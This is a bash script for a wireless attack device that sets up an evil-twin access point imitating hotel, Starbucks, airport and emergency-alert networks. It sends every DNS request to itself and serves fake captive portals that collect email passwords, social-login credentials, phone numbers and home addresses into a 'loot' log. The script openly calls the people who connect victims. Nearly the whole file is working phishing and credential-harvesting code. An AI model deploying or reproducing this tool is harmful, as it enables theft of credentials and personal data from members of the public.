#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# SIREN - Social Infrastructure Reconnaissance & Enticement Network
# Developed by: bad-antics
# 
# Advanced captive portal with multiple lures - Hotel, Airport, Coffee, Social
#═══════════════════════════════════════════════════════════════════════════════

LOOT_DIR="/mmc/nullsec/siren"
PORTAL_DIR="/mmc/nullsec/portals"
mkdir -p "$LOOT_DIR" "$PORTAL_DIR/siren"

PROMPT "    ╔═╗╦╦═╗╔═╗╔╗╔
    ╚═╗║╠╦╝║╣ ║║║
    ╚═╝╩╩╚═╚═╝╝╚╝
━━━━━━━━━━━━━━━━━━━━━━━━━
The Wireless Lure

Sing them to their doom
with irresistible
network names.

They will connect.
They will submit.
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"

PROMPT "SIREN SONGS:

1. Hotel WiFi
2. Airport Free
3. Coffee Shop
4. Social Login
5. Corporate Guest
6. Free Premium WiFi
7. Government Alert
8. WiFi Survey (Prize)"

SONG=$(NUMBER_PICKER "Choose song (1-8):" 1)

# Set SSID and portal based on selection
case $SONG in
    1) SSID="Marriott_Guest_WiFi"; PORTAL_TYPE="hotel" ;;
    2) SSID="Airport_Free_WiFi"; PORTAL_TYPE="airport" ;;
    3) SSID="Starbucks_WiFi"; PORTAL_TYPE="coffee" ;;
    4) SSID="Free_WiFi_Social"; PORTAL_TYPE="social" ;;
    5) SSID="GUEST-NETWORK"; PORTAL_TYPE="corporate" ;;
    6) SSID="FREE_PREMIUM_WIFI"; PORTAL_TYPE="premium" ;;
    7) SSID="EMERGENCY_ALERT"; PORTAL_TYPE="government" ;;
    8) SSID="WiFi_Survey_WIN"; PORTAL_TYPE="survey" ;;
esac

CUSTOM_SSID=$(TEXT_PICKER "SSID (or use default):" "$SSID")
[ -n "$CUSTOM_SSID" ] && SSID="$CUSTOM_SSID"

CONFIRMATION_DIALOG "DEPLOY SIREN:
SSID: $SSID
Portal: $PORTAL_TYPE

Victims will be lured
to submit credentials.

Deploy?"
[ $? -ne 0 ] && exit 0

INTERFACE="wlan0"
LOOT_FILE="$LOOT_DIR/siren_$(date +%Y%m%d_%H%M%S).txt"

# Generate portal HTML
create_portal() {
    local TYPE="$1"
    local HTML="$PORTAL_DIR/siren/index.html"
    
    case $TYPE in
        hotel)
            cat > "$HTML" << 'HOTEL_HTML'
<!DOCTYPE html>
<html><head><title>Hotel Guest WiFi</title>
<style>body{font-family:Arial;background:#1a1a2e;color:#fff;margin:0;padding:20px}
.container{max-width:400px;margin:0 auto;background:#16213e;padding:30px;border-radius:10px}
h1{color:#e94560;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}
button{width:100%;padding:15px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer}</style>
</head><body><div class="container"><h1>🏨 Hotel Guest WiFi</h1>
<p>Please enter your room details to connect</p>
<form action="/capture" method="POST">
<input name="room" placeholder="Room Number" required>
<input name="lastname" placeholder="Last Name" required>
<input name="email" type="email" placeholder="Email Address" required>
<button type="submit">Connect to WiFi</button>
</form></div></body></html>
HOTEL_HTML
            ;;
        social)
            cat > "$HTML" << 'SOCIAL_HTML'
<!DOCTYPE html>
<html><head><title>Free WiFi - Login</title>
<style>body{font-family:Arial;background:#0f0f0f;color:#fff;margin:0;padding:20px}
.container{max-width:400px;margin:0 auto;background:#1a1a1a;padding:30px;border-radius:10px}
.btn{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;cursor:pointer;font-size:16px}
.fb{background:#1877f2;color:#fff}.google{background:#fff;color:#333}.twitter{background:#1da1f2;color:#fff}</style>
</head><body><div class="container"><h1>🌐 Free WiFi Access</h1>
<p>Sign in with your social account</p>
<form action="/capture" method="POST">
<input name="email" type="email" placeholder="Email" style="width:100%;padding:12px;margin:10px 0">
<input name="password" type="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0">
<button class="btn fb">Continue with Facebook</button>
<button class="btn google">Continue with Google</button>
<button class="btn twitter">Continue with Twitter</button>
</form></div></body></html>
SOCIAL_HTML
            ;;
        government)
            cat > "$HTML" << 'GOV_HTML'
<!DOCTYPE html>
<html><head><title>⚠️ Emergency Alert System</title>
<style>body{font-family:Arial;background:#8B0000;color:#fff;margin:0;padding:20px}
.container{max-width:500px;margin:0 auto;background:#000;padding:30px;border:3px solid #ff0;border-radius:10px}
h1{color:#ff0;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}
button{width:100%;padding:15px;background:#ff0;color:#000;border:none;border-radius:5px;cursor:pointer;font-weight:bold}</style>
</head><body><div class="container"><h1>⚠️ EMERGENCY ALERT ⚠️</h1>
<p style="color:#ff0">MANDATORY REGISTRATION REQUIRED</p>
<p>Due to recent security concerns, all devices must be registered.</p>
<form action="/capture" method="POST">
<input name="fullname" placeholder="Full Legal Name" required>
<input name="phone" placeholder="Phone Number" required>
<input name="email" type="email" placeholder="Email Address" required>
<input name="address" placeholder="Home Address" required>
<button type="submit">REGISTER DEVICE</button>
</form></div></body></html>
GOV_HTML
            ;;
        *)
            cat > "$HTML" << 'DEFAULT_HTML'
<!DOCTYPE html>
<html><head><title>Free WiFi</title>
<style>body{font-family:Arial;background:#121212;color:#fff;margin:0;padding:20px}
.container{max-width:400px;margin:0 auto;background:#1e1e1e;padding:30px;border-radius:10px}
h1{text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}
button{width:100%;padding:15px;background:#4CAF50;color:#fff;border:none;border-radius:5px;cursor:pointer}</style>
</head><body><div class="container"><h1>📶 Free WiFi Access</h1>
<form action="/capture" method="POST">
<input name="email" type="email" placeholder="Email Address" required>
<input name="password" type="password" placeholder="Create Password" required>
<button type="submit">Get Free Access</button>
</form></div></body></html>
DEFAULT_HTML
            ;;
    esac
}

# Create credential capture script
cat > "$PORTAL_DIR/siren/capture.sh" << CAPTURE
#!/bin/bash
# Log credentials
echo "[$(date)] \$QUERY_STRING" >> "$LOOT_FILE"
# Redirect to success
echo "HTTP/1.1 302 Found"
echo "Location: http://success.html"
echo ""
CAPTURE
chmod +x "$PORTAL_DIR/siren/capture.sh"

# Success page
cat > "$PORTAL_DIR/siren/success.html" << 'SUCCESS'
<!DOCTYPE html>
<html><head><title>Connected!</title>
<style>body{font-family:Arial;background:#1a1a1a;color:#fff;text-align:center;padding:50px}
h1{color:#4CAF50}p{font-size:18px}</style>
</head><body><h1>✓ Connected!</h1>
<p>You now have internet access.</p>
<p>Redirecting...</p>
<script>setTimeout(()=>window.location='http://www.google.com',3000)</script>
</body></html>
SUCCESS

create_portal "$PORTAL_TYPE"

cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SIREN - Credential Harvest Log
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SSID: $SSID
 Portal: $PORTAL_TYPE
 Started: $(date)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CAPTURED CREDENTIALS:
EOF

LOG "Siren singing..."
SPINNER_START "Luring victims to $SSID..."

# Start AP
pkill hostapd dnsmasq 2>/dev/null
sleep 1

cat > /tmp/siren_hostapd.conf << HOSTAPD
interface=$INTERFACE
driver=nl80211
ssid=$SSID
channel=6
hw_mode=g
HOSTAPD

cat > /tmp/siren_dnsmasq.conf << DNSMASQ
interface=$INTERFACE
dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h
address=/#/192.168.4.1
DNSMASQ

ifconfig $INTERFACE 192.168.4.1 netmask 255.255.255.0 up
hostapd /tmp/siren_hostapd.conf -B 2>/dev/null
dnsmasq -C /tmp/siren_dnsmasq.conf 2>/dev/null

# Start web server (simple Python if available)
cd "$PORTAL_DIR/siren"
python3 -m http.server 80 2>/dev/null &
WEB_PID=$!

# Wait for user to stop
PROMPT "SIREN ACTIVE
━━━━━━━━━━━━━━━━━━━━━━━━━
Broadcasting: $SSID

Portal: $PORTAL_TYPE
Listening for victims...

Press OK to stop
and view captures.
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"

SPINNER_STOP

# Cleanup
pkill hostapd dnsmasq 2>/dev/null
kill $WEB_PID 2>/dev/null

CAPTURES=$(grep -c "^\[" "$LOOT_FILE" 2>/dev/null || echo 0)

cat >> "$LOOT_FILE" << EOF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SIREN STOPPED
 Total Captures: $CAPTURES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

PROMPT "SIREN SILENCED
━━━━━━━━━━━━━━━━━━━━━━━━━
The song ends.

SSID: $SSID
Captures: $CAPTURES

Log: $LOOT_FILE
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"
